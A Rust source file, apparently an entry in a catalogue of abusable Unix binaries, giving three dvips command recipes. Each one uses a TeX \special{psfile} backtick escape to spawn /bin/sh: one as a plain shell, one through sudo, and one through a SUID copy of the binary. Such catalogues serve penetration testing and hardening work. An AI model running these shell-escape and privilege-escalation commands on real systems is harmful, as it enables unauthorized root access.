
pub static BIN_NAME: &'static str = "dvips";
pub static BIN_DESC: &'static str = "The `texput.dvi` output file produced by `tex` can be created offline and uploaded to the target.";
pub static SH_CODE: &'static str = r#"
    
    tex '\special{psfile="`/bin/sh 1>&0"}\end'
    dvips -R0 texput.dvi
"#;
pub static SUDO_CODE: &'static str = r#"
    
    tex '\special{psfile="`/bin/sh 1>&0"}\end'
    sudo dvips -R0 texput.dvi
"#;
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which dvips) .

    tex '\special{psfile="`/bin/sh 1>&0"}\end'
    ./dvips -R0 texput.dvi
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code { 
	title: "LSUID_CODE",
	code: LSUID_CODE,
	tag: Tag::LSUID,
};
